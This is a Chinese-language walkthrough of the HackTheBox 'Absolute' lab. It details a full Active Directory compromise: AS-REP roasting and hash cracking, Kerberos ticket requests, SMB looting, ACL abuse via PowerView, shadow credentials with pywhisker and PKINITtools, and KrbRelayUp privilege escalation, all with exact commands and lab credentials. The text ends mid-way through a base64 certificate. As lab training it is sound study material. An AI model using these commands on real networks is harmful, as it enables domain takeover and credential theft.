![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482153091-87197ac3-2f8c-4d02-b80b-4080afac1598.png#averageHue=%231a2331&clientId=u508f3206-e774-4&from=paste&height=731&id=ue5b0b1d0&name=image.png&originHeight=914&originWidth=1303&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=281208&status=done&style=none&taskId=u80ba8081-c673-4856-9f18-a1b28a64434&title=&width=1042.4)
Insane！

# 知识点

- Misc杂项
- TGT黄金票据伪造
- hash离线爆破
- 流量分析
- AD域渗透之Generic_write权限
- 无修复提权
- hash传递攻击
# 使用工具

- Kerbrute
- impacket/GetNPUsers.py
- impacket/GetTGT.py
- impacket/smbclient.py
- CrackMapExec
- BloodHound
- Powerviewer
- 一台win10的虚拟机
- Rubeus.exe
- KerdelayUp.exe
- RunasCS.exe
- Pywhisker.py
- PKINITtools/gettgtpkinit.py
# 信息搜集
老规矩，测测它
```
└─# nmap -sS -sV -sC 10.10.11.181
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 21:42 CST
Nmap scan report for 10.10.11.181
Host is up (0.71s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-13 20:43:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-04-13T20:44:50+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-04-13T20:44:49+00:00; +6h59m59s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-13T20:44:50+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-13T20:44:49+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time:
|   date: 2023-04-13T20:44:37
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.98 seconds
```
看得到smb端口445和一些RDP远程服务，并且扫到了域名`absolute.htb、dc.absolute.htb`，早早的先加入到hosts文件里
`echo 10.10.11.181 absolute.htb >>/etc/hosts`
`echo 10.10.11.181 dc.absolute.htb >> /etc/hosts`
看得到web80端口是开了，直接浅浅的访问一波

# 可疑のPNG
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681395322377-f4a50f1f-bd8d-429c-a94f-b805e0213be8.png#averageHue=%2376bb73&clientId=ue5fd4797-6b36-4&from=paste&height=846&id=u6f135a19&name=image.png&originHeight=1057&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=862156&status=done&style=none&taskId=u93e15ab6-226e-4afa-9381-b5299d260ae&title=&width=1536)
可以看到有很多规律的hero_x图片，把他们下载下来送给`exiftool`分析一下
`for i in {1..10};do wget "[http://10.10.11.181/images/hero_$i.jpg"](http://10.10.11.181/images/hero_$i.jpg") &>/dev/null;done`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681395686935-dbb63d6a-f11c-4c42-99d1-f3ec823675f4.png#averageHue=%232d2c25&clientId=ue5fd4797-6b36-4&from=paste&height=275&id=ucd078b7f&name=image.png&originHeight=344&originWidth=870&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=436559&status=done&style=none&taskId=u6ca2cc24-ba18-407b-8595-1a845b5a77d&title=&width=696)
直接脱下来然后送给exiftool分析一波大的
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681395745505-c6aaea39-d7ee-467f-a289-20d1b7bcfe5a.png#averageHue=%23313028&clientId=ue5fd4797-6b36-4&from=paste&height=203&id=u26b9efe9&name=image.png&originHeight=254&originWidth=971&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=375242&status=done&style=none&taskId=uf6411c62-30f5-4086-a852-e782d8564c7&title=&width=776.8)
得到了以下人名
```
James.Roberts
Michael.Chaffrey
Donald.Klay
Sarah.Osvald
Jeffer.Robinson
Nicole.Smith
```
这些人名可能有用，我们就保存在这里先，根据这些人名，我们将上面的人名转换为一些潜在的可能用户名（这一步有点扯感觉）
```
James.Roberts
jroherts
j.roherts
Michael.Chaffrey
mchaffrey
m.chaffrey
Donald.Klay
dklay
d.klay
Sarah.Osvald
sosvald
s.osvald
Jeffer.Robinson
jrobinson
j.robinson
Nicole.Smith
nsmith
n.smith
```

# 开放のKerberos端口
> 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-13 20:43:45Z)

namp扫描记录中有这么一条，这是一个kerberos服务，众所周知kerberos是域渗透的基础，这里介绍一款神兵利器Kerbrute,这个工具可以用来检测用户名是否有效

`git clone [https://github.com/ropnop/kerbrute.git](https://github.com/ropnop/kerbrute.git)`
`[https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)`
果断的选择了下面的编译好了的工具^ ^
使用上面制造的字典进行爆破
`GetNPUsers.py absolute.htb/d.klay -dc-ip 10.10.11.181 -no-pass`，记得Forest那台靶机吗
> 在AS_REP阶段，会返回由我们请求的域账户hash加密某个值后返回。然后我们通过自身的ntlm hash去解密得到数据。在这里设置不要求预身份验证后，我们可以在AS_REQ阶段，填写想要伪造请求的用户名，随后会用伪造请求的用户名NTLM Hash加密返回给我们。随后我们就可以拿去爆破了，不过前提就是需要伪造请求的用户名设置了"不要求Kerberos预身份认证"

假如kerberos没有开启pre auth，我们就可以进行离线hash爆破，先用上面的指令给他的hash dump出来，之后用john狠狠爆破一下
`john passwd.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681398109500-78faf43d-a802-4497-8a5c-4252fa6c09dd.png#averageHue=%23313128&clientId=ue208d6bb-f52f-4&from=paste&height=299&id=u328fed06&name=image.png&originHeight=374&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=811425&status=done&style=none&taskId=u9f31f2e1-934f-48ed-adb7-1a9cb9582e3&title=&width=1267.2)
获取一组用户密码`d.klay/Darkmoonsky248girl`
`Darkmoonsky248girl ($krb5asrep$23$d.klay@ABSOLUTE.HTB)`
，这时候我想到的居然是ssh去登录
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681398158254-8751e34f-9dcf-4a0a-a5de-3b67047b1aa6.png#averageHue=%23292922&clientId=ue208d6bb-f52f-4&from=paste&height=94&id=uce907874&name=image.png&originHeight=118&originWidth=867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161403&status=done&style=none&taskId=u95bed8f9-e339-49a7-afe0-5091e5a46da&title=&width=693.6)
只能说是铸币了，anyway我们已经得到了一组用户和密码，接下来该思考的是怎么去利用了

# SMB尝试
再来一款神兵利器，`crackmapexec`，这东西集成了很多功能，包括smb、ldap的攻击，十分的方便
[https://github.com/Porchetta-Industries/CrackMapExec/releases/tag/v5.4.0](https://github.com/Porchetta-Industries/CrackMapExec/releases/tag/v5.4.0)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681398625570-36a32328-13fa-4e77-9acc-a848865e164f.png#averageHue=%232d2c24&clientId=ue208d6bb-f52f-4&from=paste&height=230&id=u736115b9&name=image.png&originHeight=288&originWidth=753&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=325331&status=done&style=none&taskId=u1ad74795-147e-444a-ad6d-31e711a7751&title=&width=602.4)
集成多种攻击，其中包含smb，来用smb板块探测一下共享目录，用我们上面的用户
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681398697955-993eb607-35f2-457f-9280-f7ca1da98d01.png#averageHue=%23303028&clientId=ue208d6bb-f52f-4&from=paste&height=157&id=u0444d4c3&name=image.png&originHeight=196&originWidth=1531&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=451573&status=done&style=none&taskId=u23bf88b2-08b7-4392-8836-6529581b81a&title=&width=1224.8)
不过显然是以失败告终的QWQ，还缺点东西。结合给我们的一组用户，可能是提示我们需要伪造黄金票据（TGT）去获取进一步的信息

# TGT黄金票据伪造（大坑）
使用impacket包下的`impacket-getTGT`
`impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip dc.absolute.htb`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681398967965-cbf118f5-93f8-4f6f-9579-26c8b249b544.png#averageHue=%23303028&clientId=ue208d6bb-f52f-4&from=paste&height=249&id=uc2610752&name=image.png&originHeight=311&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=620707&status=done&style=none&taskId=udf0fa15d-8cf3-4f66-82e8-750cff12556&title=&width=1176)
好耶，黄金票据GET，给他导进环境变量
`export KRB5CCNAME=/opt/d.klay.ccache`
` ./cme ldap dc.absolute.htb -k --kdcHost dc.absolute.htb --users`
![](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681448516653-3fcdbf8b-2f86-4862-82ec-aa5a2cd346c7.png#averageHue=%23030407&clientId=u157c9eeb-21bd-4&from=paste&id=u966296a2&originHeight=399&originWidth=1175&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ud4989ef7-954a-453d-b345-cbe315210ea&title=)
假如不出意外你会得到上面的结果，但我就出意外了，我得到的结果如下，很抽象。。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681448550428-ae01064e-50ba-44bd-87fb-e3e6b3990071.png#averageHue=%232a2a23&clientId=u157c9eeb-21bd-4&from=paste&height=167&id=ued2cb996&name=image.png&originHeight=209&originWidth=1556&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=481015&status=done&style=none&taskId=u1b213baf-06ac-4709-9f37-845e1e1ac58&title=&width=1244.8)
我不知道这是为啥。。可能是，不知道为啥，反正就是巨他妈玄学
这样我们可以得到第二组用户名密码`svc_smb/AbsoluteSMBService123!`，按照上述操作给他也伪造一个凭证
之后使用`impacket-smbclient`模块访问他的目录
`impacket-smbclient -k -no-pass -dc-ip dc.absolute.htb 'dc.absolute.htb'`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681448883892-8babe6ce-41b0-4cdb-8b54-d9c22fb907de.png#averageHue=%232f2f27&clientId=u157c9eeb-21bd-4&from=paste&height=298&id=u64fa4d16&name=image.png&originHeight=372&originWidth=1348&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=752369&status=done&style=none&taskId=u2b15d833-aca4-4e5b-ad2b-c17cbb8f87d&title=&width=1078.4)
```
# ls
[-] No share selected
# use shared
# ls
drw-rw-rw-          0  Fri Sep  2 01:02:23 2022 .
drw-rw-rw-          0  Fri Sep  2 01:02:23 2022 ..
-rw-rw-rw-         72  Fri Sep  2 01:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Fri Sep  2 01:02:23 2022 test.exe
# ls
drw-rw-rw-          0  Fri Sep  2 01:02:23 2022 .
drw-rw-rw-          0  Fri Sep  2 01:02:23 2022 ..
-rw-rw-rw-         72  Fri Sep  2 01:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Fri Sep  2 01:02:23 2022 test.exe
# get compiler.sh
# get test.exe
# Bye!
```
现在就能下载，说明我们的票据伪造的是成功了的，至于为什么列不出来ldap用户，我觉得原因就2点

- 工具问题
- 环境问题
- WSL有什么勾八问题（可能性很小）

这个工具我看别人都是用的5.30，在这里我用的是5.40，不知道为啥5.30的工具我使用不了，会报错
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681449088857-0c55f9a9-7001-486a-82dd-6631325852e6.png#averageHue=%23323228&clientId=u157c9eeb-21bd-4&from=paste&height=498&id=u054d1910&name=image.png&originHeight=622&originWidth=1444&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1257182&status=done&style=none&taskId=uc0e12d93-0033-4290-b006-865d1a5adf3&title=&width=1155.2)
我也是用的python3.10版本，但是玄学的东西来了，我用windows的就可以运行
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681449109097-2882d3a9-8a6d-459e-bd7e-d15ad654993a.png#averageHue=%23323227&clientId=u157c9eeb-21bd-4&from=paste&height=512&id=u969c66f3&name=image.png&originHeight=640&originWidth=1390&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1084312&status=done&style=none&taskId=u350b1bfc-dcd3-46a3-8852-cbf40cb17e5&title=&width=1112)
这我就不理解了。。我的kali也安装不了所谓的python3.10,只能是3.11，这就给我整哭了motherfucker

# 填坑填坑
上面不是说得不到结果吗，本质原因就是因为工具版本，使用`crackmapexec5.3`版本及其一下的版本，5.4.0垃圾版本全是bug
然后怎么使用5.3版本最稳妥呢？答案是Pipenv
## pipenv
pipenv是一款Python vm搭建工具，使用pipenv可以给你创造一个sandbox，在这个box中python环境是根据工具要求而定下来的
我是参考上述文章的，首先先把crackmapexec的源码下载下来
`git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec`
再安装一些需要的包
`apt-get install -y libssl-dev libffi-dev python-dev build-essential`
然后开始安装pipenv
` pip install --user pipenv`
安装好过后进入源码内，用pipenv解析搭建python的sandbox
`cd CrackMapExec && pipenv install`
最后输入
`pipenv shell`就可以进入sandbox内进行一顿操作了
然后最重要的是你这时候再沙盒内，你需要用pip去安装`crackmapexec`
`pip install crackmapexec`
最后一把嗦！
`crackmapexec ldap dc.absolute.htb -k --kdcHost dc.absolute.htb --users`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681450367800-fbda44fe-877b-46e9-af68-0755fa48f412.png#averageHue=%2336362b&clientId=u157c9eeb-21bd-4&from=paste&height=560&id=ubae663c6&name=image.png&originHeight=700&originWidth=1539&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1443294&status=done&style=none&taskId=uc02d8a90-3a7e-405e-bb54-92ac6ec66d0&title=&width=1231.2)
如图我们成功获取第二组的用户名和账号

# 可疑のexe文件
anyway总而言之，我们按照上述步骤成功是把smb目录内的东西下载下来了，接下来就分析一下那个test.exe，我们把他放到windows里抓包分析
捕获一下Openvpn的网卡，然后选择追踪流，就可以发现如下内容
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681450700529-9ac980d7-3bbf-4506-bd38-e2f9a1fcee86.png#averageHue=%23f8f4f4&clientId=u157c9eeb-21bd-4&from=paste&height=783&id=ue1c66666&name=image.png&originHeight=979&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88101&status=done&style=none&taskId=u4e2e0799-d9d7-42d7-b66c-e448d8f5482&title=&width=1536)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681451064516-e33d332f-9441-4106-909e-059081542f2f.png#averageHue=%23f9f8f8&clientId=ufaa9938d-83ba-4&from=paste&height=548&id=u91cd710c&name=image.png&originHeight=685&originWidth=1480&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46912&status=done&style=none&taskId=u6e91f267-2d09-4964-a79c-684c6877ae6&title=&width=1184)
又是一组用户名密码`absolute.htb\m.lovegod:AbsoluteLDAP2022!`

# 伪造TGT票据使用BloodHound信息搜集
这一波下来也有讲究，上面得到了一组用户名密码，也是一样的伪造TGT
`ntpdate -s absolute.htb&&impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'`
这里划重点，时间同步非常重要，相当于时间戳，时间不同步票据就伪造不成功
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681451980983-46fcb9c0-e3a5-4b1b-8add-c95fd3fb03ce.png#averageHue=%232f2f25&clientId=u713d7107-98be-4&from=paste&height=109&id=u0db40d99&name=image.png&originHeight=136&originWidth=848&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=151753&status=done&style=none&taskId=u12feaa45-feea-4789-8219-0ba856144b8&title=&width=678.4)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681451984310-553e4ca6-3728-472f-aa3b-5d2bc56ff576.png#averageHue=%2336352c&clientId=u713d7107-98be-4&from=paste&height=175&id=u2a136768&name=image.png&originHeight=219&originWidth=1010&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=327166&status=done&style=none&taskId=ua4fa7789-a341-4ae6-9d13-b2f0af55a53&title=&width=808)
随之使用bloodhound进行信息搜集
这里选择了`[https://github.com/jazzpizazz/BloodHound.py-Kerberos](https://github.com/jazzpizazz/BloodHound.py-Kerberos)`这个分支的bloodhound
`python3 bloodhound.py  -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c All`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681451995444-bb259023-4669-407e-8298-aa2af9b32f60.png#averageHue=%23323128&clientId=u713d7107-98be-4&from=paste&height=380&id=ucfa7ec36&name=image.png&originHeight=475&originWidth=1462&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=981894&status=done&style=none&taskId=u8aff47ba-d2ae-428b-9792-59a111a2db9&title=&width=1169.6)

使用`MATCH(u:User) return u`查询所有的用户:
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681453217899-948ea2dc-3367-4605-808c-ebd424356e95.png#averageHue=%23eef1f5&clientId=uae925203-125a-4&from=paste&height=711&id=u464ab04c&name=image.png&originHeight=889&originWidth=1382&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156014&status=done&style=none&taskId=ub8363f18-3dcb-4995-be1a-6e098cd4c5f&title=&width=1105.6)
可以看到有一个WINRM用户，这可能就是我们的user，我们找一下有关路径
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681453240485-d35b7bd6-7bd1-4f05-ae56-24a0f7f055f9.png#averageHue=%2373b899&clientId=uae925203-125a-4&from=paste&height=806&id=u8015f7fd&name=image.png&originHeight=1007&originWidth=1725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121547&status=done&style=none&taskId=u2fe205b6-c267-44ea-a590-c746128e8f8&title=&width=1380)
发现其实很简单，我们的m.lovegod用户对NETWORK有own权限，是网络审计组，而NETWORK组对WINRM有generic_write的权限，梳理一下思路

- Generic_write权限可以改写用户属性
- 我们对NETWORK组具有own权限，我们需要将自己m.lovegod添加进NETWORK组
- NETWORK组队winrm用户有write权限可以改写属性
- 将m.lovegod用户写入winrm用户的msDS-KeyCredentialLink属性，结合相关攻击工具获取`.pfx`私钥证书文件，之后使用证书文件申请用户TGT，进而获取NTLM Hash，直接进行hash传递攻击

# AD域渗透
那么就开始实操了，对于第一步我们可以使用 Windows 或 Linux，我使用windows，那么我们就得导入一下之前打Forest用到的poverview模块了
`Import-Module .\PowerView.ps1`

` $pass=ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlain -Force`

`$cred=new-object system.management.automation.pscredential('absolute.htb\m.lovegod',$pass)`

`Add-DomainObjectAcl -Credential $cred  -TargetIdentity "Network Audit" -Rights all -DomainController "dc.absolute.htb" -PrincipalIdentity "m.lovegod"`

`Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $cred -Server dc.absolute.htb`

` Get-DomainGroupMember -Identity "Network Audit" -Domain "absolute.htb" -DomainController "dc.absolute.htb" -Credential $cred`

一套流程下来把m.lovegod用户加入到了Network Audit用户组里，并且赋予了all权限
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681474296184-47255a7c-2115-4d67-a59e-28bbb5bcd3a4.png#averageHue=%23022557&clientId=u3f4bc52a-335f-4&from=paste&height=482&id=u614ada5f&name=image.png&originHeight=603&originWidth=1114&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50632&status=done&style=none&taskId=ua99988fb-f7b1-44d7-9240-7ddfad8b5f8&title=&width=891.2)
## 坑点
首先是时区你要和靶机同步，因为票据伪造需要时间，具体方法如下
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482227485-a3512042-25d8-4075-becd-99ea6fe7f5b7.png#averageHue=%23fcfcfb&clientId=u508f3206-e774-4&from=paste&height=494&id=u3aa6195c&name=image.png&originHeight=618&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48373&status=done&style=none&taskId=u84a55b3f-e2b5-4433-9b89-6cd47663f39&title=&width=1026.4)
输入靶机IP进行同步，其次是这一步AD渗透的话，最好是在windows 2019 server虚拟机里面完成。因为虚拟机可以配置AD环境，否则就失败了
# 进一步伪造TGT
我们现在已经把m.lovegod用户加入进去了。因此我们需要重新伪造一下票据更新一下
`ntpdate -s absolute.htb&&impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!'`
`export KRB5CCNAME=/opt/m.lovegod.ccache`
然后使用工具pywhisker获取pfx认证文件
` python pywhisker/pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681474379388-afcabe7e-5c8e-47a1-80eb-af2e95f91de8.png#averageHue=%2336362c&clientId=u3f4bc52a-335f-4&from=paste&height=289&id=u1016218b&name=image.png&originHeight=361&originWidth=1315&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=720014&status=done&style=none&taskId=u7bcb608d-a794-445b-aff0-b814b6c60cd&title=&width=1052)
```
└─# python pywhisker/pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5433341b-4b83-71bd-d380-aceae025aa68
[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: fCvi61Aq.pfx
[*] Must be used with password: mrKuvg3I5GVdZ8J4Jinj
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
随后使用PKINTtool获取NTLM hash，进行hash传递攻击
` python PKINITtools/gettgtpkinit.py absolute.htb/winrm_user -cert-pfx fCvi61Aq.pfx -pfx-pass  mrKuvg3I5GVdZ8J4Jinj winrmCcache`
```
python PKINITtools/gettgtpkinit.py absolute.htb/winrm_user -cert-pfx fCvi61Aq.pfx -pfx-pass  mrKuvg3I5GVdZ8J4Jinj wi
nrmCcache
2023-04-15 03:14:21,214 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-04-15 03:14:21,225 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-04-15 03:14:33,223 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-04-15 03:14:33,223 minikerberos INFO     1cf0779f2e031f99184a8115b0b1e6d838f2d25fef528b9084f7223e1da6727e
INFO:minikerberos:1cf0779f2e031f99184a8115b0b1e6d838f2d25fef528b9084f7223e1da6727e
2023-04-15 03:14:33,225 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
这样我们也同样获取了winrm的TGT票据，我们export一下
` export KRB5CCNAME=/opt/winrmCcache`
# 获取User.txt
最后使用evilrm进行远程shell连接
`evil-winrm -i dc.absolute.htb -r absolute.htb`
## 坑
在这之前`/etc/krb5.conf`文件需要配置！配置文件如下
```
[libdefaults]
        default_realm = ABSOLUTE.HTB
[realms]
        ABSOLUTE.HTB = {
                kdc = DC.ABSOLUTE.HTB
                admin_server = ABSOLUTE.HTB
                }
```
这是因为你既然要用kerberos中的TGT票据进行winrm登录，那你首先就得配置一下kerberos客户机的配置
最后获取User.txt~
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681475652900-4a4087b6-6191-47bc-8b03-7d77f7dbf1ec.png#averageHue=%2323241f&clientId=ubaa336a8-4205-4&from=paste&height=66&id=uc846446b&name=image.png&originHeight=82&originWidth=580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75600&status=done&style=none&taskId=u68e6c0fa-aa81-4363-b05d-51ac8fbcab8&title=&width=464)


# 无修复提权（root.txt)
这里是使用到了`No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials`

- 没有强制执行 LDAP 签名的域控制器（默认）
- 具有自己的服务器身份验证证书的域控制器（用于 PKINIT 身份验证）
- 能够写入目标计算机帐户的 msDs-KeyCredentialLink 属性（默认）

前两点域控dc是满足的，最后一点m.lovegod用户也是有的，目前我们只有一个域管理员，我们需要[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)、[Rubeus](https://github.com/GhostPack/Rubeus)和[RunasCS](https://github.com/antonioCoco/RunasCs)（让 m.lovegod 执行 KrbRelay）。
首先下载这三个工具。
`./RunasCs.exe m.lovegod 'AbsoluteLDAP2022!'-d absolute.htb -l 9 "C:\Users\winrm_user\Desktop\KK.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"`
可以看到得到如下结果
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482479340-0f1af29c-3fa9-4cf3-aaa3-4c9ea62515f2.png#averageHue=%233a3a30&clientId=u508f3206-e774-4&from=paste&height=573&id=uc35c863e&name=image.png&originHeight=716&originWidth=1440&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1498785&status=done&style=none&taskId=ufa6689bc-184c-462a-a60e-cf7836e61c9&title=&width=1152)
我们取其中的BASE字符运行如下指令
`./Rubeus.exe asktgt /user:DC$ /certificate:MIIKSAIBAzCCCgQGCSqGSIb3DQEHAaCCCfUEggnxMIIJ7TCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAh9+Hc63T9xUwICB9AEggTYh51cbbkLovgroUeKPMseyGiUO2r+xnZwaRcGLNxGo6LbGcuBz89rp+VJVCmG1/P+u0c1MRwTI85sJMP3pEYb0NLNezAO9VCpWH/Fn5JbxTtHfVToDTeDr/Qwq7t3B/PTPsAx0p5XmK09u2RMXoP4n6TLet7Q5NwozVpEnKTgfCGnUKHJavv5Z0fJTPY4UHJ4rYzimncvZ6zslSUWLboVwJSPEbKYWfmsPy4gGfKpDmURyWH8SXSYdv8vb2EonkFk6FsJSrj4V07u3rcxBzu+YOFfZXscHL5NWfsPQ26LjwraNbAJJLHEYGQAc7VqB4SdO9jvYJ2JCcJE9SSIyFrKvQPCAkaRrTEPMMaMz+ZCnxQLchE6AtukLzrfIBNxuxDMKtwlie/kSSsUPHb11Cs+YG1aie3KkAR14QzLnqx6teaBEk6bTB7JPXFUuV8VTP8cX3p5liPfPNZFbDEE6FfhUNvqrKOxBVx7CS361Zk3707/4JjoKF0FwoxP6xWTuZqMhcBuj5ncBIYNRgH2FegwW/RUl4ouLH+Uk+fiJSIJhLl3F+X54WVoF5PN/DKJSN4hV4+N6cDIL5T3je4T4qZ/XnEj+mrqi+lp/JNQbjfEmnWRTbdPVZm290yf4cJ5MgIqzSKUN6X/c9FphzM0gto8KsPEteNUWdN7cf5ecQAL1RVAXzJptl4gB37ejFvvEea33sXNFV7519HqeZkXJsH5lUCyxvJQPire9W31XucBxuSvJqTHBg2wmxAElufj36T7zaOY59fqwHFxJtS3cYoKlGy//4XSUFRYz3GxxqxahWnLoJMWT2a3nLl4KBnwqb0mubXY0kyhA21FAb6EuK62dB9jx8D8B4Ye6asXZF/UnAh2Mr6pLNEUXoSgkqmeJ/bEAq8g/wOxbjizzctFO0Cm/2MpjvLaHHL0TPr7xP/EcfTyGkLwo+IXIbTAIHoRj9m7iBPvy9g/2sOWcN/zFkFGM7T6D4jty7za0a1EtvkAkJ8ZjKBtvT5FWIggukmUvNJPXF81Y5y2qmd5dPXgQ3YnH9DxzAXCxd7dGj8B7Ts/uuJUpL/2Od/TBekgrp/pItZpKLVYhsTbDPGPg6htFDEPPJb1O/3aMz1EOVQwj7Y28onRu+afepwKpAB+hd8S1153TwlGsglOetQNoK+GNhROizJRABMyoCJ